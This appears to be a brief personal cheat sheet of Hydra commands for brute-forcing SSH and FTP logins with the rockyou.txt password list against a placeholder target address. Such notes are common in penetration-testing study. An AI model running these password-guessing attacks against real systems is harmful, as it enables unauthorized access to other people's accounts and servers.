# Hydra

## Brute Force SSH using a USERNAME.
    hydra -l <username> -P /home/rodney/MyWordlists/rockyou.txt ssh://<IPtarget>
    
## Brute Force SSH using a USERLIST and PASSLIST.
    hydra -L <userlist.txt> -P /home/rodney/MyWordlists/rockyou.txt ssh://<IPtarget>    
    
Service can be change:

## Brute Force FTP using a USERLIST and PASSLIST.
    hydra -L <userlist.txt> -P /home/rodney/MyWordlists/rockyou.txt ftp://<IPtarget>    
